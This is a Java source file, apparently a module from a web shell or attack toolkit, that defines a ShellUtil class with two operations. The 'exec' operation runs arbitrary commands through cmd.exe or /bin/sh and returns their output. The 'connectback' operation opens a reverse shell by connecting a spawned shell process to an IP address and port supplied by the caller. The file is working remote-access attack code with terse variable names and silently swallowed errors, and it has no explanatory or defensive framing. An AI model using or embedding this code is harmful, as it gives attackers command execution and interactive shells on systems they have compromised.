import java.io.*;
import java.net.Socket;
import java.util.concurrent.RecursiveTask;

public class ShellUtil extends Object{
    public static String run(String methodName, String params, String encoding) {
        String res = "";
        if (methodName.equals("exec")) {
            res = ShellUtil.exec(params, encoding);
        }else if (methodName.equals("connectback")) {
            String ip = params.substring(0, params.indexOf("^"));
            String port = params.substring(params.indexOf("^") + 1);
            res = ShellUtil.connectBack(ip, Integer.parseInt(port));
        }else {
            res = "unkown methodName";
        }
        return res;
    }

    public static String exec(String command, String encoding) {
        StringBuffer result = new StringBuffer();
        try {
            String[] finalCommand;
            if (System.getProperty("os.name").toLowerCase().contains("windows")) {
                String systemRootvariable;
                try {
                    systemRootvariable = System.getenv("SystemRoot");
                }
                catch (ClassCastException e) {
                    systemRootvariable = System.getProperty("SystemRoot");
                }
                finalCommand = new String[3];
                finalCommand[0] = systemRootvariable+"\\system32\\cmd.exe";
                finalCommand[1] = "/c";
                finalCommand[2] = command;
            } else { // Linux or Unix System
                finalCommand = new String[3];
                finalCommand[0] = "/bin/sh";
                finalCommand[1] = "-c";
                finalCommand[2] = command;
            }
            BufferedReader readerIn = null;
            BufferedReader readerError = null;
            try {
                readerIn = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(finalCommand).getInputStream(),encoding));
                String stemp = "";
                while ((stemp = readerIn.readLine()) != null){
                    result.append(stemp).append("\n");
                }
            }catch (Exception e){
                result.append(e.toString());
            }finally {
                if (readerIn != null) {
                    readerIn.close();
                }
            }
            try {
                readerError = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(finalCommand).getErrorStream(), encoding));
                String stemp = "";
                while ((stemp = readerError.readLine()) != null){
                    result.append(stemp).append("\n");
                }
            }catch (Exception e){
                result.append(e.toString());
            }finally {
                if (readerError != null) {
                    readerError.close();
                }
            }
        } catch (Exception e) {
            result.append(e.toString());
        }
        return result.toString();
    }

    public static String connectBack(String ip, int port) {
        class StreamConnector extends Thread {
            InputStream sp;
            OutputStream gh;

            StreamConnector(InputStream sp, OutputStream gh) {
                this.sp = sp;
                this.gh = gh;
            }
            @Override
            public void run() {
                BufferedReader xp = null;
                BufferedWriter ydg = null;
                try {
                    xp = new BufferedReader(new InputStreamReader(this.sp));
                    ydg = new BufferedWriter(new OutputStreamWriter(this.gh));
                    char buffer[] = new char[1024];
                    int length;
                    while ((length = xp.read(buffer, 0, buffer.length)) > 0) {
                        ydg.write(buffer, 0, length);
                        ydg.flush();
                    }
                } catch (Exception e) {}
                try {
                    if (xp != null) {
                        xp.close();
                    }
                    if (ydg != null) {
                        ydg.close();
                    }
                } catch (Exception e) {
                }
            }
        }
        try {
            String sp;
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                sp = new String("/bin/sh");
            } else {
                sp = new String("cmd.exe");
            }
            Socket sk = new Socket(ip, port);
            Process ps = Runtime.getRuntime().exec(sp);
            (new StreamConnector(ps.getInputStream(), sk.getOutputStream())).start();
            (new StreamConnector(sk.getInputStream(), ps.getOutputStream())).start();
        } catch (Exception e) {
        }
        return "^OK^";
    }


}